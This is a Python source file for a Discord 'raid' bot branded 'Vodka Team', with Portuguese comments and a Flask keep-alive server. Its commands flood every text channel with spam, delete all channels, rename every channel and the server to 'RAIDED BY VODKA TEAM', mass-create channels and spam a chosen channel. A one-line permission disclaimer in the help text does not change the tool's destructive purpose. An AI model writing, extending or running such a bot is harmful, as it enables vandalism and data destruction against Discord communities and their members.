import discord
from discord.ext import commands
import asyncio
import os
import sys
from dotenv import load_dotenv
import threading
from flask import Flask

# Carregar variáveis de ambiente
load_dotenv()

TOKEN = os.getenv('DISCORD_TOKEN')

if not TOKEN:
    print("❌ TOKEN não encontrado! Verifique o arquivo .env")
    sys.exit(1)

# Configurar intents
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='•', intents=intents)

# ========== SERVIDOR HTTP PARA O RENDER ==========
app = Flask('')

@app.route('/')
def home():
    return "🍺 VODKA BOT ESTÁ RODANDO! 🍺"

def run_flask():
    app.run(host='0.0.0.0', port=10000)

# Iniciar servidor Flask em thread separada
threading.Thread(target=run_flask, daemon=True).start()
# ================================================

# ========== FUNÇÕES DE TEXTO ==========
def load_text():
    try:
        with open('texto.txt', 'r', encoding='utf-8') as f:
            return f.read().strip()
    except FileNotFoundError:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write("🍺 RAIDED BY VODKA TEAM 🍺")
        return "🍺 RAIDED BY VODKA TEAM 🍺"
    except Exception as e:
        print(f"Erro ao carregar texto: {e}")
        return "🍺 RAIDED BY VODKA TEAM 🍺"

def update_text(new_text):
    try:
        with open('texto.txt', 'w', encoding='utf-8') as f:
            f.write(new_text)
        return True
    except Exception as e:
        print(f"Erro ao atualizar texto: {e}")
        return False

# ========== EVENTOS ==========
@bot.event
async def on_ready():
    print(f'✅ Bot logado como {bot.user}')
    print(f'✅ Em {len(bot.guilds)} servidores')
    await bot.change_presence(activity=discord.Game(name="•help_bot | Vodka Team"))

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        await ctx.send(f"❌ Comando não encontrado! Use •help_bot para ver os comandos.", delete_after=5)
    else:
        print(f"Erro: {error}")

# ========== COMANDOS ==========

@bot.command()
async def ping(ctx):
    """Verifica a latência do bot"""
    try:
        latency = round(bot.latency * 1000)
        embed = discord.Embed(
            title="🏓 Pong!",
            description=f"Latência: **{latency}ms**",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed, delete_after=10)
    except Exception as e:
        await ctx.send(f"❌ Erro: {str(e)}")

@bot.command()
async def nuke(ctx):
    """Envia 5 mensagens em TODOS os canais"""
    try:
        await ctx.message.delete()
        texto = load_text()
        guild = ctx.guild
        
        contador = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    for i in range(5):
                        await channel.send(f"**{texto}**\n💀 Mensagem {i+1}/5")
                        await asyncio.sleep(0.2)
                    contador += 1
                except discord.Forbidden:
                    pass
                except Exception as e:
                    print(f"Erro no canal {channel.name}: {e}")
                    
        embed = discord.Embed(
            title="💀 NUKE EXECUTADO!",
            description=f"✅ {contador} canais atacados com 5 mensagens cada!",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def end(ctx):
    """Apaga TODOS os canais do servidor"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        # Backup dos nomes dos canais
        channels_backup = {}
        for channel in guild.channels:
            channels_backup[channel.id] = channel.name
        
        # Apagar canais
        count = 0
        for channel in guild.channels:
            try:
                if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.CategoryChannel)):
                    await channel.delete()
                    count += 1
                    await asyncio.sleep(0.3)
            except discord.Forbidden:
                pass
            except Exception as e:
                print(f"Erro ao apagar canal: {e}")
        
        # Criar canal de log
        try:
            new_channel = await guild.create_text_channel("💀-end")
            embed = discord.Embed(
                title="💀 TODOS OS CANAIS FORAM APAGADOS!",
                description=f"✅ {count} canais removidos com sucesso!",
                color=discord.Color.red()
            )
            embed.add_field(name="Backup", value=str(list(channels_backup.values()))[:1000], inline=False)
            await new_channel.send(embed=embed)
        except:
            pass
            
        # Renomear servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
            
    except Exception as e:
        print(f"Erro no comando end: {e}")

@bot.command()
async def rename_all(ctx):
    """Renomeia todos os canais e o servidor"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        contador = 0
        for channel in guild.channels:
            if isinstance(channel, discord.TextChannel):
                try:
                    await channel.edit(name="raided-by-vodka-team")
                    contador += 1
                    await asyncio.sleep(0.2)
                except:
                    pass
        
        # Renomear servidor
        try:
            await guild.edit(name="💀 RAIDED BY VODKA TEAM 💀")
        except:
            pass
            
        embed = discord.Embed(
            title="✅ RENOMEADO!",
            description=f"{contador} canais renomeados para RAIDED BY VODKA TEAM",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def set_text(ctx, *, texto):
    """Atualiza o texto das mensagens"""
    try:
        await ctx.message.delete()
        if update_text(texto):
            embed = discord.Embed(
                title="✅ TEXTO ATUALIZADO!",
                description=f"Novo texto: **{texto}**",
                color=discord.Color.green()
            )
            await ctx.send(embed=embed, delete_after=5)
        else:
            await ctx.send("❌ Erro ao atualizar texto!", delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def create_channels(ctx, quantidade: int = 10):
    """Cria N canais (padrão: 10)"""
    try:
        await ctx.message.delete()
        guild = ctx.guild
        
        if quantidade > 50:
            quantidade = 50
            await ctx.send("⚠️ Limitado a 50 canais por vez!", delete_after=5)
        
        criados = 0
        for i in range(quantidade):
            try:
                await guild.create_text_channel(f"🍺-vodka-{i+1}")
                criados += 1
                await asyncio.sleep(0.2)
            except:
                pass
                
        embed = discord.Embed(
            title="✅ CANAIS CRIADOS!",
            description=f"{criados} canais criados com sucesso!",
            color=discord.Color.green()
        )
        await ctx.send(embed=embed, delete_after=5)
        
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def spam(ctx, canal: discord.TextChannel = None, quantidade: int = 10):
    """Spam em um canal específico"""
    try:
        await ctx.message.delete()
        target = canal or ctx.channel
        texto = load_text()
        
        for i in range(quantidade):
            await target.send(f"**{texto}**\n💀 Spam {i+1}/{quantidade}")
            await asyncio.sleep(0.1)
            
        await ctx.send(f"✅ {quantidade} mensagens enviadas em {target.mention}", delete_after=5)
    except Exception as e:
        await ctx.send(f'❌ Erro: {str(e)}')

@bot.command()
async def help_bot(ctx):
    """Mostra todos os comandos"""
    embed = discord.Embed(
        title="🍺 VODKA TEAM BOT - COMANDOS",
        description="Comandos de diversão e caos total!",
        color=discord.Color.red()
    )
    embed.add_field(
        name="📌 COMANDOS PRINCIPAIS",
        value=(
            "`•ping` - Verifica latência do bot\n"
            "`•nuke` - 5 mensagens em TODOS os canais\n"
            "`•end` - Apaga TODOS os canais 💀\n"
            "`•rename_all` - Renomeia tudo\n"
            "`•set_text <texto>` - Muda a mensagem\n"
            "`•create_channels <qtd>` - Cria canais\n"
            "`•spam <canal> <qtd>` - Spam em canal"
        ),
        inline=False
    )
    embed.add_field(
        name="⚠️ AVISO",
        value="Use com responsabilidade! Apenas em servidores onde você tem permissão.",
        inline=False
    )
    embed.set_footer(text="🍺 VODKA TEAM - Power to the people!")
    
    await ctx.send(embed=embed)

# ========== RODAR O BOT ==========
if __name__ == "__main__":
    print("🚀 Iniciando bot...")
    try:
        bot.run(TOKEN)
    except discord.LoginFailure:
        print("❌ Token inválido!")
    except Exception as e:
        print(f"❌ Erro ao rodar bot: {e}")
